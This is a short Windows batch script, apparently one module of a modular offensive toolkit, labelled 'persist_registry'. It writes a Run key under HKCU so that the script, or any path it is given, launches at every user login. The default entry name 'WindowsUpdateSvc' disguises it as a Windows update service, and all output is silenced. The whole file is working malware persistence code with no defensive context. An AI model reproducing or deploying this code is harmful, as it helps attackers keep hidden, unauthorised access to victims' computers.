REM provides: persist_registry
REM depends: (none)
REM description: Add registry Run key for persistence at user login

if not defined PERSIST_NAME set "PERSIST_NAME=WindowsUpdateSvc"
if not defined PERSIST_PATH set "PERSIST_PATH=%~f0"

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "%PERSIST_NAME%" /t REG_SZ /d "\"%PERSIST_PATH%\"" /f >nul 2>nul
